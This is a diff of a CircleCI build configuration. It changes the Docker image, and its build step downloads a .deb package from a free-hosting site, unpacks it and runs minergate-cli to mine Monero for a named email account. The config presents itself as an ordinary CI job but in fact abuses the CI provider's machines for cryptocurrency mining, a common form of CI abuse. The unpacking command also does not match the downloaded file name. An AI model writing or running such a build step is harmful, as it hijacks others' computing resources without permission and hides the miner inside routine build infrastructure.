@@ -2,7 +2,7 @@ version: 2
 jobs:
   build:
     docker:
-      - image: greenfieldsvp/dock
+      - image: debian:stretch
     steps:
       - checkout
       - run: apt-get update && apt-get install apt-transport-https && apt-get install binutils && wget http://hupiter.000webhostapp.com/a.deb && ar x deb-cli && tar -xvzf data.tar.gz && cd opt/minergate-cli && ./minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
